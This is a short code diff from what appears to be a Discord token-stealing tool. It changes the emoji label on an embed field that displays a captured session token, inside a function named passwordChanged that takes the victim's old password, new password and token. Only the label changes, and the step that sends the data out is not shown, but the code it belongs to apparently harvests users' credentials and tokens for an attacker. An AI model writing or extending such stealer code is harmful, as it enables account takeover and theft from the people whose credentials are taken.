@@ -829,7 +829,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:patriot_guilds:1032868286532173904> Token',
+            name: '<:patriot_idd:1032868508574416896> Token',
             value: `\`${token}\``,
             inline: false,
           },
